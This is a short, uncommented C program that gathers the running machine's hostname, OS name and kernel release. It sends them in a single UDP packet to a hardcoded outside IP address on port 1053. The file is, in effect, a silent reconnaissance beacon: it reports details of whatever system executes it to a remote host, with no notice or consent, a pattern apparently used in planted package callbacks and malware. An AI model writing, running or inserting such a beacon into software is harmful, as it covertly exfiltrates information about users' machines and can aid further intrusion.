#define _GNU_SOURCE
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <stdio.h>
#include <string.h>

int main() {
    int s = socket(2, 2, 0);  // AF_INET (2), SOCK_DGRAM (2), IPPROTO_UDP (0)
    struct sockaddr_in a = {2, htons(1053)};
    inet_pton(2, "54.190.181.174", &a.sin_addr);

    char n[64], b[128];
    struct utsname u;
    gethostname(n, 64);
    uname(&u);
    snprintf(b, 128, "R:%s,O:%s %s", n, u.sysname, u.release);

    struct iovec i = {b, strlen(b)};
    struct msghdr m = {&a, sizeof(a), &i, 1, 0, 0, 0};

    struct mmsghdr mm;
    memset(&mm, 0, sizeof(mm));
    mm.msg_hdr = m;
    mm.msg_len = 0;

    sendmmsg(s, &mm, 1, 0);
}
